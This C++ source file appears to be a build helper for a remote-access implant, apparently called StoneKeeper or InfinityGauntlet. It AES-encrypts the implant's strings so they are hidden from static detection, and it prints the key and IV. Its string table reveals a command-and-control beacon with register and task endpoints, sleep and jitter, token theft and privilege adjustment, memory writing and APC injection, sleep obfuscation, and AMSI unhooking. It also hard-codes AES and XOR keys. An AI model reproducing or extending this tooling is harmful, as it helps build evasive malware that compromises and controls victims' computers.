#include <iostream>
#include <vector>
#include <string>
#include <sstream>
#include <iomanip>
#include "SecureString.hpp"
#include <openssl/evp.h>
#include <openssl/rand.h>

class AES {
public:
    AES() : key(32), iv(12) {  // Initialize key and IV vectors in the constructor's initializer list
        // Generate random key and IV
        if (!generateRandomKeyAndIV(key, iv)) {
            std::cerr << "Failed to generate key and IV." << std::endl;
        }
    }

    // Declare key and IV arrays
    std::vector<unsigned char> key; // 256-bit key for AES-256
    std::vector<unsigned char> iv;  // 96-bit IV for AES GCM

    // Utility function to convert bytes to a SecureString in hex format
    SecureString bytesToHex(const unsigned char* bytes, size_t length) {
        std::stringstream hexStream;
        hexStream << std::hex << std::setfill('0');
        for (size_t i = 0; i < length; ++i) {
            hexStream << std::setw(2) << static_cast<int>(bytes[i]);
        }
        return SecureString(hexStream.str().c_str());
    }

    // Utility function to convert a hex string to a byte vector
    std::vector<unsigned char> hexToBytes(const SecureString& hex) {
        std::vector<unsigned char> bytes;
        for (size_t i = 0; i < hex.size(); i += 2) {
            SecureString byteString = hex.substr(i, 2);
            unsigned char byte = (unsigned char)strtol(byteString.c_str(), nullptr, 16);
            bytes.push_back(byte);
        }
        return bytes;
    }

    // Function to generate a random key and IV as std::vector<unsigned char>
    bool generateRandomKeyAndIV(std::vector<unsigned char>& key, std::vector<unsigned char>& iv) {
        // Generate random key
        if (!RAND_bytes(key.data(), key.size())) {
            std::cerr << "Error: Unable to generate random key." << std::endl;
            return false;
        }

        // Generate random IV
        if (!RAND_bytes(iv.data(), iv.size())) {
            std::cerr << "Error: Unable to generate random IV." << std::endl;
            return false;
        }

        return true;
    }

    // Utility function to print a buffer in hex
    void printHex(const char* label, const unsigned char* buf, size_t len) {
        std::cout << label;
        for (size_t i = 0; i < len; i++) {
            printf("%02X", buf[i]);
        }
        std::cout << std::endl;
    }

    SecureString Encrypt(SecureString data) {
        // Get the plaintext as a vector of unsigned chars
        std::vector<unsigned char> plaintext(data.begin(), data.end());

        // Buffer for ciphertext using vector
        std::vector<unsigned char> ciphertext(plaintext.size() + EVP_MAX_BLOCK_LENGTH);

        // Buffer for the decrypted text using vector
        std::vector<unsigned char> decrypted(plaintext.size()  + 1);

        // Buffer for the tag
        unsigned char tag[16];  // 128 bit tag

        // Encrypt
        EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
        EVP_EncryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL);
        EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, iv.size(), NULL);
        EVP_EncryptInit_ex(ctx, NULL, NULL, key.data(), iv.data());

        int outlen;
        EVP_EncryptUpdate(ctx, ciphertext.data(), &outlen, plaintext.data(), plaintext.size());
        size_t ciphertext_len = outlen;

        // Finalize Encryption
        EVP_EncryptFinal_ex(ctx, ciphertext.data() + outlen, &outlen);
        ciphertext_len += outlen;

        // Get the tag
        EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_GET_TAG, 16, tag);

        //printHex("Tag: ", tag, sizeof(tag));

        // Clean up encryption context
        EVP_CIPHER_CTX_free(ctx);

        // Create a new vector with the exact size of the ciphertext
        std::vector<unsigned char> exactSizeCiphertext(ciphertext.begin(), ciphertext.begin() + ciphertext_len);
        // Append the tag to the exactSizeCiphertext vector
        exactSizeCiphertext.insert(exactSizeCiphertext.end(), tag, tag + sizeof(tag));
        // Now exactSizeCiphertext contains the ciphertext followed by the tag, with no extra padding

        return bytesToHex(exactSizeCiphertext.data(), exactSizeCiphertext.size());
    };

    SecureString Decrypt(SecureString data) {
        //std::vector<unsigned char> ciphertextWithTag(data.begin(), data.end());
        std::vector<unsigned char> ciphertextWithTag = hexToBytes(data);

        // Separate ciphertext and tag
        std::vector<unsigned char> ciphertext(ciphertextWithTag.begin(), ciphertextWithTag.end() - 16);
        std::vector<unsigned char> tag(ciphertextWithTag.end() - 16, ciphertextWithTag.end());

        // Buffer for the decrypted text
        std::vector<unsigned char> decrypted(ciphertext.size());

        // Decrypt
        EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
        EVP_DecryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL);
        EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, iv.size(), NULL);
        EVP_DecryptInit_ex(ctx, NULL, NULL, key.data(), iv.data());

        int outlen;
        EVP_DecryptUpdate(ctx, decrypted.data(), &outlen, ciphertext.data(), ciphertext.size());
        int decrypted_len = outlen;

        // Set expected tag value
        EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_TAG, tag.size(), tag.data());

        // Finalize Decryption
        int ret = EVP_DecryptFinal_ex(ctx, decrypted.data() + outlen, &outlen);

        // Clean up decryption context
        EVP_CIPHER_CTX_free(ctx);

        return SecureString(decrypted.begin(), decrypted.end());
    };

private:

};

void generateEncryptedDefines(const std::vector<std::pair<SecureString, SecureString>>& pairs) {
    AES aes;
    printf("// BEGIN DEFINITIONS DON'T REMOVE\n");
    for (const auto& pair : pairs) {
        printf("// %s\nstatic SecureString %s;\n", pair.second.c_str(), pair.first.c_str());
    }
    printf("// END DEFINITIONS DON'T REMOVE\n");

    printf("// BEGIN STATIC STORAGE DON'T REMOVE\n");
    for (const auto& pair : pairs) {
        printf("SecureString StringCrypt::%s;\n", pair.first.c_str());
    }
    printf("// END STATIC STORAGE DON'T REMOVE\n");
    
    printf("// BEGIN ENCRYPTED STRINGS\n");

    SecureString keyHex = aes.bytesToHex(aes.key.data(), aes.key.size());
    SecureString ivHex = aes.bytesToHex(aes.iv.data(), aes.iv.size());
    printf("Key = Crypt::DecodeHex(SecureString(\"%s\"));\n", keyHex.c_str());
    printf("IV = Crypt::DecodeHex(SecureString(\"%s\"));\n", ivHex.c_str());

    for (const auto& pair : pairs) {
        SecureString encryptedHex = aes.Encrypt(pair.second);
        //SecureString decrypted = aes.Decrypt(encryptedHex);
        printf("%s = \"%s\";\n", pair.first.c_str(), encryptedHex.c_str());
        //printf("Encrypted: %s\n", encryptedHex.c_str());
        //printf("Decrypted: %s\n", decrypted.c_str());
    }
    printf("// END ENCRYPTED STRINGS\n");
}

int main() {
    std::vector<std::pair<SecureString, SecureString>> stringPairs = {
        // .\Instance.cpp
        {"IP_CRYPT", "127.0.0.1"},
        {"PORT_CRYPT", "6969"},
        {"AESKEY_CRYPT", "be3856cdcd8e8d4688a4e3256b5349725e6148a815bcf11dc99cbf445fc18f29"},
        {"XORKEY_CRYPT", "1ae3f18f8dc1bf4ff2b96ec222fc67b90b5f8c1b9c3e6e86300724f6cdef8d62"},
        {"IV_CRYPT", "b6d422ee9783d62acd43b829"},
        {"USERAGENT_CRYPT", "StoneKeeper Agent/1.0"},
        {"RETRIEVINGMODULEBASEADDRESS_CRYPT", "Retrieving module base address"},
        {"NTSTATUSFAIL_CRYPT", " failed with NTSTATUS code: 0x"},
        {"LASTERRORFAIL_CRYPT", " failed with error code: 0x"},
        {"FAILED_CRYPT", " failed"},
        {"NUMBERTOOLARGEFORDWORD_CRYPT", "The number in the string is too large for a DWORD."},
        {"ID_CRYPT", "ID"},
        {"NAME_CRYPT", "Name"},
        {"LISTENERID_CRYPT", "ListenerID"},
        {"SLEEP_CRYPT", "Sleep"},
        {"JITTER_CRYPT", "Jitter"},
        {"EXTERNALIP_CRYPT", "ExternalIP"},
        {"INTERNALIP_CRYPT", "InternalIP"},
        {"TIME_CRYPT", "Time"},
        {"HOSTNAME_CRYPT", "Hostname"},
        {"TOKEN_CRYPT", "Token"},
        {"USERNAME_CRYPT", "Username"},
        {"OS_CRYPT", "OS"},
        {"ACTIVE_CRYPT", "Active"},
        {"TIMEOUTREACHEDFORTASK_CRYPT", "Timeout reached for task using timeout value "},
        {"AGENTID_CRYPT", "AgentID"},
        {"COMMAND_CRYPT", "Command"},
        {"ARGUMENTS_CRYPT", "Arguments"},
        {"TIMEOUT_CRYPT", "Timeout"},
        {"SUCCESS_CRYPT", "Success"},
        {"INQUEUE_CRYPT", "InQueue"},
        {"TIMEDOUT_CRYPT", "TimedOut"},
        {"CREATETIME_CRYPT", "CreateTime"},
        {"ENDTIME_CRYPT", "EndTime"},
        {"RESULT_CRYPT", "Result"},
        {"NUMBERSUPPERLOWER_CRYPT", "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"},
        {"GETTINGPROCESSINFORMATION_CRYPT", "Getting process information"},
        {"QUERYINGTHREADINFORMATION_CRYPT", "Querying thread information"},
        {"GETTINGSYSTEMINFORMATION_CRYPT", "Getting system information"},
        {"OPENINGPROCESS_CRYPT", "Opening process"},
        {"OPENINGTOKEN_CRYPT", "Opening token"},
        {"DUPLICATINGTOKEN_CRYPT", "Duplicating token"},
        {"SETTINGTHREADINFORMATION_CRYPT", "Setting thread information"},
        {"PRIVILEGEVALUELOOKUP_CRYPT", "Privilege value lookup"},
        {"ADJUSTINGTOKEN_CRYPT", "Adjusting token"},
        {"QUERYINGTOKEN_CRYPT", "Querying token"},
        {"SIDLOOKUP_CRYPT", "SID lookup"},
        {"COMPUTERNAMEREGISTRY_CRYPT", "\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ComputerName"},
        {"COMPUTERNAME_CRYPT", "ComputerName"},
        {"OPENINGKEY_CRYPT", "Opening key"},
        {"QUERYINGKEY_CRYPT", "Querying key"},
        {"CURRENTVERSIONREGISTRY_CRYPT", "\\Registry\\Machine\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion"},
        {"PRODUCTNAME_CRYPT", "ProductName"},
        {"DISPLAYVERSION_CRYPT", "DisplayVersion"},
        {"CURRENTBUILD_CRYPT", "CurrentBuild"},
        {"LOW_CRYPT", "LOW"},
        {"MEDIUM_CRYPT", "MEDIUM"},
        {"HIGH_CRYPT", "HIGH"},
        {"SYSTEM_CRYPT", "SYSTEM"},
        {"UNKNOWN_CRYPT", "UNKNOWN"},
        {"QUEUINGAPCTHREADFAILED_CRYPT", "Queuing APC thread failed"},
        {"PROCESSCOLON_CRYPT", "Process: "},
        {"PIPEIDCOLON_CRYPT", " | ID: "},
        {"PIPEUSERCOLON_CRYPT", " | User: "},
        {"PIPETOKENCOLON_CRYPT", " | Token: "},
        {"CREATINGPIPE_CRYPT", "Creating pipe"},
        {"CREATINGPROCESS_CRYPT", "Creating process"},
        {"READINGMEMORY_CRYPT", "Reading memory"},
        {"PROTECTINGMEMORY_CRYPT", "Protecting memory"},
        {"WRITINGMEMORY_CRYPT", "Writing memory"},

        // .\Crypt.cpp
        {"OUTOFRANGEERROR_CRYPT", "Out of range error"},
        {"CHARSETISEMPTY_CRYPT", "Charset is empty."},
        {"BIO_NEWFORBASE64FAILED_CRYPT", "BIO_new for base64 failed."},
        {"BIO_NEWFORMEMORYBUFFERFAILED_CRYPT", "BIO_new for memory buffer failed."},
        {"BIO_WRITEFAILED_CRYPT", "BIO_write failed."},
        {"BIO_FLUSHFAILED_CRYPT", "BIO_flush failed."},
        {"BIO_GET_MEM_PTRFAILED_CRYPT", "BIO_get_mem_ptr failed."},
        {"BIO_NEW_MEM_BUFFAILED_CRYPT", "BIO_new_mem_buf failed."},
        {"BIO_READFAILED_CRYPT", "BIO_read failed."},
        {"INVALIDBASE64INPUTLENGTH_CRYPT", "Invalid Base64 input length."},
        {"HEXSTRINGHASODDLENGTH_CRYPT", "Hex string has odd length"},
        {"ERRORGENERATINGCHACHA20KEY_CRYPT", "Error generating ChaCha20 key"},
        {"ERRORGENERATINGCHACHA20NONCE_CRYPT", "Error generating ChaCha20 nonce"},
        {"EVP_CIPHER_CTX_NEWFAILED_CRYPT", "EVP_CIPHER_CTX_new failed."},
        {"CHACHA20ENCRYPTIONDECRYPTIONFAILED_CRYPT", "ChaCha20 encryption/decryption failed"},
        {"CHACHA20FINALIZATIONFAILED_CRYPT", "ChaCha20 finalization failed"},

        // .\Http.cpp
        {"REGISTER_CRYPT", "/register/"},
        {"TASKS_CRYPT", "/tasks/"},
        {"ERROR_CRYPT", "/error/"},
        {"PWINHTTPOPEN_CRYPT", "pWinHttpOpen"},
        {"PWINHTTPCONNECT_CRYPT", "pWinHttpConnect"},
        {"GET_CRYPT", "GET"},
        {"PWINHTTPOPENREQUEST_CRYPT", "pWinHttpOpenRequest"},
        {"PWINHTTPSETOPTION_CRYPT", "pWinHttpSetOption"},
        {"PWINHTTPSENDREQUEST_CRYPT", "pWinHttpSendRequest"},
        {"PWINHTTPRECEIVERESPONSE_CRYPT", "pWinHttpReceiveResponse"},
        {"PWINHTTPQUERYHEADERS_CRYPT", "pWinHttpQueryHeaders"},
        {"PWINHTTPQUERYDATAAVAILABLE_CRYPT", "pWinHttpQueryDataAvailable"},
        {"PWINHTTPREADDATA_CRYPT", "pWinHttpReadData"},
        {"POST_CRYPT", "POST"},

        // Main.cpp
        {"FAILEDTORESOLVEVXTABLE_CRYPT", "Failed to resolve VX table"},
        {"FAILEDTORESOLVEWIN32TABLES_CRYPT", "Failed to resolve Win32 tables"},
        {"MAXRETRIESREACHED_CRYPT", "Max retries reached"},
        {"SECUREEXCEPTION_CRYPT", "Secure Exception: " },
        {"UNKNOWNEXCEPTIONOCCURRED_CRYPT", "Unknown Exception occurred."},

        // .\SleepObfuscation.cpp
        {"INVALIDDOSSIGNATURE_CRYPT", "Invalid DOS signature"},
        {"INVALIDNTSIGNATURE_CRYPT", "Invalid NT signature"},
        {"TEXT_CRYPT", ".text"},
        {"GETTINGNAMEDOBJECTDIRECTORY_CRYPT", "Getting named object directory"},
        {"CREATINGTIMER_CRYPT", "Creating timer"},
        {"SETTINGTIMER_CRYPT", "Setting timer"},
        {"RELOC_CRYPT", ".reloc"},
        {"CREATINGTIMERS_CRYPT", "Creating timers"},
        {"FAILEDTOFINDGADGETS_CRYPT", "Failed to find gadgets"},

        // .\StackHeapCrypt.cpp
        {"OPENINGTHREAD_CRYPT", "Opening thread"},
        {"SUSPENDINGTHREAD_CRYPT", "Suspending thread"},
        {"RESUMINGTHREAD_CRYPT", "Resuming thread"},

        // .\Unhooker.cpp
        {"FINDINGFUNC_CRYPT", "Finding func"},
        {"AMSIDLL_CRYPT", "amsi.dll"},
        {"LOADINGDLL_CRYPT", "Loading DLL"},
        {"RETRIEVINGHEADERS_CRYPT", "Retrieving headers"},
        {"OPENINGIMAGE_CRYPT", "Opening image"},
        {"QUERYINGFILEINFO_CRYPT", "Querying file info"},
        {"READINGIMAGE_CRYPT", "Reading image"},

        // .\Win32.cpp
        {"KERNEL32DLL_CRYPT", "kernel32.dll"},
        {"ADVAPI32DLL_CRYPT", "advapi32.dll"},
        {"CRYPT32DLL_CRYPT", "crypt32.dll"},
        {"USER32DLL_CRYPT", "user32.dll"},
        {"SHELL32DLL_CRYPT", "shell32.dll"},
        {"WINHTTPDLL_CRYPT", "winhttp.dll"},
        {"MSCOREEDLL_CRYPT", "mscoree.dll"},
        {"OLEAUT32DLL_CRYPT", "oleaut32.dll"},
        {"WS2_32DLL_CRYPT", "ws2_32.dll"},
        {"KERNELBASEDLL_CRYPT", "kernelbase.dll"},
        {"CRYPTSPDLL_CRYPT", "cryptsp.dll"},
        {"IPHLPAPIDLL_CRYPT", "iphlpapi.dll"},

        // .\PatcherAndHooker
        {"INITIALIZINGCRITICALSECTION_CRYPT", "Initializing critical section"},
        {"ALLOCATINGMEMORY_CRYPT", "Allocating memory"},
        
        // .\SimpleJson.cpp
        {"IDJSONPATTERN_CRYPT", "\"ID\":"},
        {"AGENTIDJSONPATTERN_CRYPT", "\"AgentID\":"},
        {"TIMEOUTJSONPATTERN_CRYPT", "\"Timeout\":"},
        {"ACTIVEJSONPATTERN_CRYPT", "\"Active\":"},
        {"SUCCESSJSONPATTERN_CRYPT", "\"Success\":"},
        {"INQUEUEJSONPATTERN_CRYPT", "\"InQueue\":"},
        {"TIMEDOUTJSONPATTERN_CRYPT", "\"TimedOut\":"},
        {"TRUEJSONPATTERN_CRYPT", "true"},
        {"COMMANDJSONPATTERN_CRYPT", "\"Command\":"},
        {"CREATETIMEJSONPATTERN_CRYPT", "\"CreateTime\":"},
        {"ENDTIMEJSONPATTERN_CRYPT", "\"EndTime\":"},
        {"RESULTJSONPATTERN_CRYPT", "\"Result\":"},
        {"ARGUMENTSJSONPATTERN_CRYPT", "\"Arguments\":"},

        // .\SecureString.cpp
        {"NULLPOINTERPASSEDTOSECURESTRINGCONSTRUCTOR_CRYPT", "Null pointer passed to SecureString constructor"},
        {"NULLPOINTERPASSEDTOSECURESTRINGASSIGN_CRYPT", "Null pointer passed to SecureString::assign"},        
        {"EMPTYRANGEPASSEDTOSECURESTRINGCONSTRUCTOR_CRYPT", "Empty range passed to SecureString constructor"},
        {"EMPTYRANGEPASSEDTOSECURESTRINGASSIGN_CRYPT", "Empty range passed to SecureString::assign"},
        {"RANDOMBYTESGENERATIONERROR_CRYPT", "Random bytes generation error"},
        {"INVALIDHEXCHARACTER_CRYPT", "Invalid hex character"},
        {"INDEXOUTOFRANGE_CRYPT", "Index out of range"},

        // .\SecureWideString.cpp
        {"NULLPOINTERPASSEDTOSECUREWIDESTRINGCONSTRUCTOR_CRYPT", "Null pointer passed to SecureWideString constructor"},
        {"EMPTYRANGEPASSEDTOSECUREWIDESTRINGCONSTRUCTOR_CRYPT", "Empty range passed to SecureWideString constructor"},
        {"EMPTYRANGEPASSEDTOSECUREWIDESTRINGAPPEND_CRYPT", "Empty range passed to SecureWideString::append"},

        // .\ThreadPool.cpp
        {"CREATINGEVENT_CRYPT", "Creating event"},
        {"ALLOCATINGANEWTHREADPOOL_CRYPT", "Allocating a new thread pool"},
        {"SETTINGTHEMINIMUMNUMBEROFTHREADSFORTHEPOOL_CRYPT", "Setting the minimum number of threads for the pool"},
        {"SETTINGTHEMAXIMUMNUMBEROFTHREADSFORTHEPOOL_CRYPT", "Setting the maximum number of threads for the pool"},
        {"ALLOCATINGAWORKITEM_CRYPT", "Allocating a work item"},
        {"POSTINGTHEWORKITEMTOTHETHREADPOOL_CRYPT", "Posting the work item to the thread pool"},
        
        // ..\InfinityGauntlet\C++\InfinityGauntlet\NetworkAdapters.cpp
        {"NONE_CRYPT", "NONE"},
        {"OTHER_CRYPT", "OTHER"},
        {"TEREDO_CRYPT", "TEREDO"},
        {"IPHTTPS_CRYPT", "IPHTTPS"},
        {"ISATAP_CRYPT", "ISATAP"},
        {"SIXTOFOUR_CRYPT", "6TO4"},
        {"DIRECT_CRYPT", "DIRECT"},
        {"OTHER_CAP_CRYPT", "Other"},
        {"ETHERNET_CRYPT", "Ethernet"},
        {"TOKENRING_CRYPT", "Token Ring"},
        {"PPP_CRYPT", "PPP"},
        {"LOOPBACK_CRYPT", "Loopback"},
        {"ATM_CRYPT", "ATM"},
        {"VIRTUAL_VPN_CRYPT", "Virtual (VPN)"},
        {"IEEE802_11WIRELESS_CRYPT", "IEEE 802.11 Wireless"},
        {"TUNNEL_CRYPT", "Tunnel"},
        {"IEEE1394_CRYPT", "IEEE 1394"},
        {"WWANPP_CRYPT", "WWANPP"},
        {"WWANPP2_CRYPT", "WWANPP2"},
        {"UNKNOWN_CAP_CRYPT", "Unknown"},
        {"UP_CAP_CRYPT", "Up"},
		{"DOWN_CAP_CRYPT", "Down"},
        {"SPACE_MBPS_CRYPT", " Mbps"},
        {"SPACE_GBPS_CRYPT", " Gbps"},
        {"N_SLASH_A_CRYPT", "N/A"},
        {"TRUE_CAP_CRYPT", "True"},
		{"FALSE_CAP_CRYPT", "False"},
        {"ADAPTERNAMECOLON_CRYPT", "Adapter Name: "},
        {"ADAPTERDESCRIPTIONCOLON_CRYPT", "Adapter Description: "},
        {"MACADDRESSCOLON_CRYPT", "MAC Address: "},
        {"DNSSUFFIXCOLON_CRYPT", "DNS Suffix: "},
        {"OPERATIONALSTATUSCOLON_CRYPT", "Operational Status: "},
        {"ADAPTERTYPECOLON_CRYPT", "Adapter Type: "},
        {"TUNNELTYPECOLON_CRYPT", "Tunnel Type: "},
        {"DHCPV4SERVERCOLON_CRYPT", "DHCPv4 Server: "},
        {"DHCPV6SERVERCOLON_CRYPT", "DHCPv6 Server: "},
        {"TRANSMITLINKSPEEDCOLON_CRYPT", "Transmit Link Speed: "},
        {"RECEIVELINKSPEEDCOLON_CRYPT", "Receive Link Speed: "},
        {"ADDITIONALDNSSUFFIXCOLON_CRYPT", "Additional DNS Suffix: "},
        {"IPADDRESSCOLON_CRYPT", "IP Address: "},
        {"DNSSERVERCOLON_CRYPT", "DNS Server: "},
        {"WINSSERVERCOLON_CRYPT", "WINS Server: "},
        {"GATEWAYADDRESSCOLON_CRYPT", "Gateway Address: "},
        {"DDNSENABLEDCOLON_CRYPT", "DDNS Enabled: "},
        {"REGISTERADAPTERSUFFIXCOLON_CRYPT", "Register Adapter Suffix: "},
        {"DHCPV4ENABLEDCOLON_CRYPT", "DHCPv4 Enabled: "},
        {"RECEIVEONLYCOLON_CRYPT", "Receive Only: "},
        {"NOMULTICASTCOLON_CRYPT", "No Multicast: "},
        {"IPV6OTHERSTATEFULCONFIGCOLON_CRYPT", "IPv6 Other Stateful Config: "},
        {"NETBIOSOVERTCPIPENABLEDCOLON_CRYPT", "NetBIOS Over TCP/IP Enabled: "},
        {"IPV4ENABLEDCOLON_CRYPT", "IPv4 Enabled: "},
        {"IPV6ENABLEDCOLON_CRYPT", "IPv6 Enabled: "},
        {"IPV6MANAGEDADDRESSCONFIGCOLON_CRYPT", "IPv6 Managed Address Config: "},
        {"GETTINGADAPTERADDRESSES_CRYPT", "Getting adapter addresses"},
    };

    generateEncryptedDefines(stringPairs);

    return 0;
}
